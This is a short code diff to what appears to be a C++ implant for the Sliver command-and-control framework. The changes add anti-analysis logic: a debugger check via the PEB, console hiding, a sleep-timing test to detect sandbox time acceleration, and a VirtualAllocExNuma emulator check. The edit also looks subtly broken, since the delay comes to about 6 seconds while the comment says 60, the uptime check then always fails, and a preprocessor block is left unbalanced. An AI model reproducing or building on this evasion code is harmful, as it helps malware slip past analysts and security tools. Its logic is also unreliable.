@@ -23,8 +23,6 @@
 #pragma warning(disable:4996)
 #include <winternl.h>
 #include "Sliver-CPPImplant.h"
-using namespace std;
-using namespace transports;
 using namespace uuids;
 
 //typedef struct _ECCkeyPair {
@@ -505,16 +503,20 @@ int Entry() {
     if (pPEB->BeingDebugged) return 0;
 
     FreeConsole();
-#endif
-#ifdef DELAY
+
     ULONGLONG uptimeBeforeSleep = GetTickCount64();
     typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
     PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
     LARGE_INTEGER delay;
-    delay.QuadPart = -10000 * 100000; // 100 seconds
+    PVOID m = NULL;
+    delay.QuadPart = -600 * 100000; // 60 seconds
     pNtDelayExecution(FALSE, &delay);
     ULONGLONG uptimeAfterSleep = GetTickCount64();
     if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
+
+    m = VirtualAllocExNuma(GetCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0);
+    if (m == NULL)
+        return 0;
 #endif
 #ifdef  PIVOT
 #ifdef SMBPIVOT
